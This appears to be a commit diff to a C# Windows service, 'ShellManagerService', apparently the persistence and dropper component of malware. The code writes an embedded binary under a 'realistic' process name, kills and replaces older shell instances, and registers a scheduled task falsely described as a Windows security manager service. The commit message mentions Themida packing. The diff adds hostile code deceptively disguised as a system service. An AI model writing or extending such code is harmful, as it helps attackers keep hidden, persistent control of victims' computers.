Added support for themida protection on the building script

+++ ShellManagerService/ShellManager.cs
@@ -22,50 +22,50 @@ namespace ShellManagerService
             //Call the process with some "realistic" name
             string tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, exe_name);
 
-            Process[] pname = Process.GetProcessesByName(exe_name);
-            if (GetMD5HashFromFile(backup_shell_folder + backup_shell_name) != GetMD5HashFromBuffer(embedded_image_1))
+            if (File.Exists(tmp_name))
             {
-		//If hashes don't match it means the service holds a newer version, so kill all instances of the shell and backup
-		Process[] backup_shells = Process.GetProcessesByName(backup_shell_name);
-		foreach(var proc in backup_shells)
-		{
-		    proc.Kill();
-		}
-                foreach(var process in pname)
+                Process[] pname = Process.GetProcessesByName(exe_name.Split('.').First());
+                using (var stream = File.OpenRead(tmp_name))
                 {
-                    process.Kill();
+                    byte[] data = new byte[stream.Length];
+                    stream.Read(data, 0, (int)stream.Length);
+
+                    if (!data.SequenceEqual(embedded_image_1))
+                    {
+                        Process[] backup_shells = Process.GetProcessesByName(backup_shell_name.Split('.').First());
+                        foreach (var proc in backup_shells)
+                        {
+                            proc.Kill();
+                            proc.WaitForExit();
+                        }
+                        foreach (var process in pname)
+                        {
+                            process.Kill();
+                            process.WaitForExit();
+                        }
+                    }
+                    else
+                    {
+                        //Check if shell is already running
+
+                        if (pname.Length > 0) //Shell is running
+                        {
+                            return;
+                        }
+                    }
                 }
-            }
-            else
-            {
-                //Check if shell is already running
 
-                if (pname.Length > 0) //Shell is running
-                {
-                    return;
-                }
+                //else delete the file
+                File.Delete(tmp_name);
             }
 
-            //else delete the file
-            File.Delete(tmp_name);
-
-            if (!File.Exists(old_tmp_name)) //If temp file gets deleted create a new one
-            {
-                File.Create(tmp_name);
-            }
-            else //else rename temp file
-            {
-                File.Move(old_tmp_name, tmp_name);
-            }
 
             while (true)
             {
                 try
                 {
                     //Write bytes into file
-                    FileStream fs = new FileStream(tmp_name,
-                                           FileMode.Open,
-                                           FileAccess.Write);
+                    FileStream fs = File.Create(tmp_name);
                     fs.Write(embedded_image_1, 0, embedded_image_1.Length);
                     fs.Close();
                     break;
@@ -91,9 +91,7 @@ namespace ShellManagerService
                     try
                     {
                         //Write bytes into file
-                        FileStream fs = new FileStream(full_path,
-                                               FileMode.Open,
-                                               FileAccess.Write);
+                        FileStream fs = File.Create(full_path);
                         fs.Write(embedded_image_1, 0, embedded_image_1.Length);
                         fs.Close();
                         break;
@@ -120,34 +118,6 @@ namespace ShellManagerService
                     .Starting(DateTime.Now.AddSeconds(3))
                     .AsTask("Windows security manager service is used to check health and integrity of important system resources and must be run regularly.");
             }
-        }
-        public static string GetMD5HashFromFile(string fileName)
-        {
-            try
-            {
-                using (var md5 = MD5.Create())
-                {
-                    using (var stream = File.OpenRead(fileName))
-                    {
-                        return BitConverter.ToString(md5.ComputeHash(stream)).Replace("-", string.Empty);
-                    }
-                }
-            }
-            catch { return string.Empty; }
-        }
-        public static string GetMD5HashFromBuffer(byte[] bytes)
-        {
-            try
-            {
-                using (var md5 = MD5.Create())
-                {
-                    using (var stream = new MemoryStream(bytes))
-                    {
-                        return BitConverter.ToString(md5.ComputeHash(stream)).Replace("-", string.Empty);
-                    }
-                }
-            }
-            catch { return string.Empty; }
         }
     }
 }
